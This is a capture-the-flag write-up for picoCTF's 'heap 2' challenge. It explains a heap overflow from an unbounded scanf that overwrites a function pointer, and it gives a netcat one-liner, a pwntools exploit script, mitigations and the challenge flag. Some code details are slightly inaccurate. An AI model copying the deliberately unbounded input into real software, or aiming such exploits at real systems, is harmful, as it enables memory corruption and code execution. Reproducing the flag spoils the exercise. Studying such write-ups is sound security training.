# PicoCTF Heap 2 - Complete Writeup

## Challenge Overview

**Challenge Name:** heap 2  
**Category:** Binary Exploitation  
**Description:** Can you handle function pointers?  
**Hint:** Are you doing the right endianness?  

This challenge presents a classic heap exploitation scenario involving function pointers and heap overflow vulnerabilities.

## Initial Analysis

### Source Code Review

Let's examine the provided C source code to understand the program's functionality:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);
    exit(0);
}

void check_win() { 
    ((void (*)())*(int*)x)(); 
}

void init() {
    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);
    
    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);  // VULNERABILITY!
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {
    init();
    int choice;
    
    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);
        
        switch (choice) {
        case 1: print_heap(); break;
        case 2: write_buffer(); break;
        case 3: printf("\n\nx = %s\n\n", x); break;
        case 4: check_win(); break;
        case 5: return 0;
        default: printf("Invalid choice\n");
        }
    }
}
```

## Vulnerability Analysis

### The Critical Vulnerability: Heap Buffer Overflow

The primary vulnerability lies in the `write_buffer()` function:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);  // DANGEROUS!
}
```

**Why this is vulnerable:**
- `input_data` points to a heap-allocated buffer of only 5 bytes
- `scanf("%s", ...)` reads input until whitespace without bounds checking
- If input exceeds 4 characters (plus null terminator), it overflows into adjacent heap memory

### Heap Layout Understanding

When `init()` executes:
1. `input_data = malloc(5)` - Allocates 5 bytes for "pico\0"
2. `x = malloc(5)` - Allocates 5 bytes for "bico\0"

In typical heap implementations (like glibc's ptmalloc), consecutive small allocations are often placed adjacent to each other:

```
[input_data buffer (5 bytes)] [heap metadata] [x buffer (5 bytes)] [heap metadata]
```

### The Win Condition

The `check_win()` function contains the exploitation target:

```c
void check_win() { 
    ((void (*)())*(int*)x)(); 
}
```

**Breaking down this complex expression:**
1. `*(int*)x` - Dereferences `x` as an integer pointer, reading 4 bytes from the buffer pointed to by `x`
2. `(void (*)())` - Casts the integer value to a function pointer (function taking no args, returning void)
3. `()` - Calls the function at that address

**The Goal:** We need to overwrite the contents of the buffer pointed to by `x` with the address of the `win()` function.

## Exploitation Strategy

### Step 1: Find the Address of win()

Using GDB to find the `win()` function address:

```bash
gdb ./chall
(gdb) disass win
```

Output shows: `win = 0x00000000004011a0`

### Step 2: Understanding Endianness

**Why endianness matters:**
- x86-64 architecture uses little-endian byte ordering
- Multi-byte values are stored with the least significant byte first
- When we write the address as raw bytes, we must use little-endian format

**Address conversion:**
- Original: `0x00000000004011a0`
- Little-endian bytes: `\xa0\x11\x40\x00\x00\x00\x00\x00`

### Step 3: Calculate the Overflow Offset

Using the program's heap printing functionality:

```bash
# Run the program and select option 1 to print heap
1. Print Heap
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x1e462b0  ->   pico
+-------------+-----------+
[*]   0x1e462d0  ->   bico
```

**Calculating offset:**
- `x` address: `0x1e462d0`
- `input_data` address: `0x1e462b0`
- Offset: `0x1e462d0 - 0x1e462b0 = 0x20` (32 bytes in decimal)

This means we need 32 bytes of padding to reach the beginning of the `x` buffer.

### Step 4: Crafting the Payload

**Payload structure:**
```
[32 bytes of padding] + [8 bytes of win() address in little-endian]
```

**Final payload:**
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00
```

## Exploitation Methods

### Method 1: Using echo and netcat

```bash
echo -e -n "2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00\n3\n4\n" | nc mimas.picoctf.net 50729
```

**Command breakdown:**
- `-e`: Enable interpretation of backslash escapes
- `-n`: Suppress trailing newline
- `2\n`: Select menu option 2 (write to buffer)
- `AAAA...`: 32 bytes of padding
- `\xa0\x11\x40\x00\x00\x00\x00\x00`: win() address in little-endian
- `3\n`: Select option 3 to verify overwrite
- `4\n`: Select option 4 to trigger check_win()

### Method 2: Python Script with pwntools

```python
from pwn import *

# Connect to remote service
p = remote('mimas.picoctf.net', 50729)

# Craft payload: 32 bytes padding + win() address
payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00'

# Send payload
p.recvuntil(b"Enter your choice: ")
p.sendline(b"2")
p.recvuntil(b"Data for buffer: ")
p.sendline(payload)

# Trigger win condition
p.recvuntil(b"Enter your choice: ")
p.sendline(b"4")

# Receive and print flag
print(p.recvall())
```

## Technical Deep Dive

### Memory Layout Visualization

**Before exploitation:**
```
input_data buffer: [p][i][c][o][\0]
x buffer:          [b][i][c][o][\0]
```

**After overflow:**
```
input_data buffer: [A][A][A][A][A]...
[heap metadata overwritten]
x buffer:          [\xa0][\x11][\x40][\x00][\x00][\x00][\x00][\x00]
```

### The Attack Flow

1. **Overflow trigger**: Menu option 2 calls `write_buffer()`
2. **Buffer overflow**: Our 40-byte payload overflows the 5-byte `input_data` buffer
3. **Memory corruption**: Overflow reaches and overwrites the `x` buffer
4. **Function pointer hijack**: `x` buffer now contains `win()` function address
5. **Code execution**: Menu option 4 calls `check_win()`, which interprets the overwritten data as a function pointer and jumps to `win()`

### Why This Works

The exploit succeeds because:
1. **Predictable heap layout**: Consecutive small allocations are adjacent
2. **No bounds checking**: `scanf("%s", ...)` doesn't validate input length
3. **Direct function call**: `check_win()` directly calls whatever address is in `x`
4. **No modern protections**: The binary lacks ASLR, stack canaries, or other modern mitigations

## Key Learning Points

### Vulnerability Classes Demonstrated

1. **Heap Buffer Overflow**: Writing beyond allocated buffer boundaries
2. **Function Pointer Hijacking**: Corrupting function pointers to redirect execution
3. **Integer Type Confusion**: Using `*(int*)x` to reinterpret data

### Security Implications

This vulnerability demonstrates how memory corruption can lead to:
- **Arbitrary code execution**: Attacker controls the instruction pointer
- **Privilege escalation**: If the program runs with elevated privileges
- **Data exfiltration**: As demonstrated by reading the flag file

### Mitigation Strategies

Modern defenses against this type of attack include:
- **Bounds checking**: Using safer functions like `fgets()` or `scanf()` with width specifiers
- **Address Space Layout Randomization (ASLR)**: Makes function addresses unpredictable
- **Stack/Heap canaries**: Detect buffer overflows before they can be exploited
- **Control Flow Integrity (CFI)**: Prevents indirect call hijacking
- **Memory tagging**: Hardware-assisted memory corruption detection

## Conclusion

The heap 2 challenge excellently demonstrates fundamental concepts in binary exploitation:
- Heap memory management vulnerabilities
- Function pointer manipulation
- Little-endian byte ordering
- Payload crafting techniques

Understanding these concepts is crucial for both offensive security research and defensive programming practices.

**Flag:** `picoCTF{and_down_the_road_we_go_7c8d6f32}`
